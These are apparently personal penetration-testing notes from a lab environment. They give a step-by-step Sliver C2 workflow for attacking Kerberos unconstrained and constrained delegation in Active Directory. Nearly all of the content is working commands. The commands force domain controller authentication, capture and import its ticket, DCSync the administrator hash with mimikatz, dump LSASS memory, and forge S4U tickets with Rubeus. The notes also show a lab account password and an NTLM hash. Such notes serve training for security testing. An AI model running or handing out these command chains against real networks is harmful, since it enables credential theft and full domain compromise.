See [[12 Kerberos]] and [[Kerberos Delegation]] for more theory on this. This will mainly just cover examples from a Sliver workflow perspective.
## Unconstrained
The following example is targeting SRV01 and DC01.

Example Workflow
```bash
# Enumerate
jell0man@htb[/htb]$ echo "Get-NetComputer -Unconstrained" | base64 
	R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg==

sliver (psexec-pivot) > sharpsh -- '-u http://<PIVOT_INTERNAL_IP>:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='
	# dc01.child.htb.local
	# srv01.child.htb.local

# Tool transfer
sliver > upload Rubeus.exe       # or whatever method you want 

# Get PsExec shell session w/ creds
# I recomend multiplayer and sliver-client instead...
proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
powershell # gets shell 
cd ../tasks
.\Rubeus.exe monitor /interval:5 /nowrap
	# Wait for high priv users to access computer's services, OR force.

# Forced computer authentication
sliver (psexec-pivot) > inline-execute-assembly /path/to/SpoolSample.exe 'dc01 srv01' # the hosts specified are out TARGETS. this will change.

# See captured TGT of DC01$ (in PsExec shell session)

# Save DC01 TGT in kirbi format
sliver > execute -o powershell.exe -command '[System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgA <SNIP> Q0hJTE"))'

OR

echo 'TGT_Base64' | base64 -d > dc01.kirbi
sliver > upload dc01.kirbi

Import the ticket to the current session and access internal resources, such as C$ on Dc01

# Dumping DA hash
C:\Windows\Tasks>.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"

privilege::debug
kerberos::ptt C:\windows\temp\dc01.kirbi
lsadump::dcsync /domain:child.htb.local /user:child\administrator
exit
```

## Constrained

```bash
# Enumeration
sliver (http-beacon) > sharpview Get-NetComputer -TrustedToAuth
	# samaccountname = comp account
	# msds-allowedtodelegateto = shows hosts comp can delegate TO

# Exploitation - requires SYSTEM
sliver (http-beacon) > ps
sliver (http-beacon) > nanodump <LSASS_PID> <host>-lsass 1 PMDM
sliver (http-beacon) > download <host>-lsass

# Dump offline
pypykatz.py lsa minidump <host>-lsass
	# Make note of NTLM hashes

# Request TGT of target computer / service account
sliver (http-beacon) > inline-execute-assembly /path/to/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'

# Impersonate priveleged user and request TGS ticket to access CIFS on target computer
	# usually impersonate Administrator, but sometimes you cant if configured that way.
sliver (http-beacon) > inline-execute-assembly /path/to/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:<TGT> /nowrap'

# Verify access
sliver (http-beacon) > ls '//srv02.child.htb.local/c$'
```